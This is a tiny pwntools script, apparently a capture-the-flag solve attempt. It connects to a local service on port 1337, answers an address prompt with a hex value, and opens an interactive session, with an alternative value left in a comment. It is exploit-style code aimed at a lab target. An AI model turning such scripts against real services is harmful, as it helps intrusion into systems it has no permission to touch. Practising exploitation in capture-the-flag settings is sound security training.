from pwn import *

io = remote("localhost", 1337)

io.sendlineafter(b"0x", b"ffffdeadbeef0000")
#io.sendlineafter(b"0x", b"7ff8deadbeefaaaa")
io.interactive()